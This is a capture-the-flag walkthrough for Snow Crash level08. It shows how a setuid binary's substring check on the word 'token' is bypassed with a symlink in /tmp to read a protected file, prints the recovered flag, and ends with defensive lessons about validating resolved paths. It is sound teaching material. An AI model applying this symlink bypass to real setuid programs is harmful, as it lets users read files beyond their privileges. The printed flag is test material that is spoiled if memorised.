## Snow Crash - Level08 Walkthrough

### 📁 Files Found

Upon logging into `level08`, the home directory contains:

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

- The binary `level08` has the **setuid bit set**, meaning it runs with the privileges of user `flag08`.
- The file `token` contains the flag but is **only readable by `flag08`**.

---

### 🔍 Binary Analysis

Decompiling or reverse engineering the binary reveals the following logic:

```c
int main(int argc, char **argv) {
    if (argc == 1) {
        printf("%s [file to read]\n", argv[0]);
        exit(1);
    }

    if (strstr(argv[1], "token")) {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
    }

    int fd = open(argv[1], O_RDONLY);
    if (fd == -1) err(1, "Unable to open %s", argv[1]);

    char buf[1024];
    ssize_t n = read(fd, buf, 1024);
    if (n == -1) err(1, "Unable to read fd %d", fd);

    write(1, buf, n);
    return 0;
}
```

### ⚠️ Vulnerability

The binary **blocks any filename containing the substring `token`** using:

```c
if (strstr(argv[1], "token"))
```

However, it uses `open()` to read the file — and `open()` **follows symbolic links**. The program doesn't sanitize the actual file path after resolution.

---

### 🧨 Exploiting the Symlink

We can **bypass the substring check** by creating a symlink to the real `token` file without using the word `"token"` in the path:

```bash
ln -s /home/user/level08/token /tmp/mylink
```

Now we run the binary with the symlink as argument:

```bash
./level08 /tmp/mylink
```

### ✅ Result

```
quif5eloekouj29ke0vouxean
```

That's the token for `flag08`!

---

### 📚 Key Takeaways

- **strstr()** only checks if a string is part of the argument, not the resolved path.
- **open()** follows symlinks by default, allowing access to restricted files if checks are shallow.
- Always resolve and validate the actual file path (e.g., using `realpath()` or `readlink()`) when implementing file access controls.
